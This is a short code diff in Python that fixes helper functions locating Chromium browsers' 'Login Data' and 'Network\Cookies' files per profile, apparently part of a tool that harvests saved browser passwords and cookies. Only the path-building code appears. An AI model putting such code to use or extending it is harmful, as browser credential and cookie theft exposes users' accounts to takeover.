@@ -195,14 +195,14 @@ def Local_State(path):
 
 def Login_Data(path):
     if "Profile" in path:
-        return path
+        return path + "\\Login Data"
     else:
         return f"{path}\\User Data\\Default\\Login Data"
 
 
 def Cookies(path):
     if "Profile" in path:
-        return path
+        return path + "\\Network\\Cookies"
     else:
         return f"{path}\\User Data\\Default\\Network\\Cookies"
 
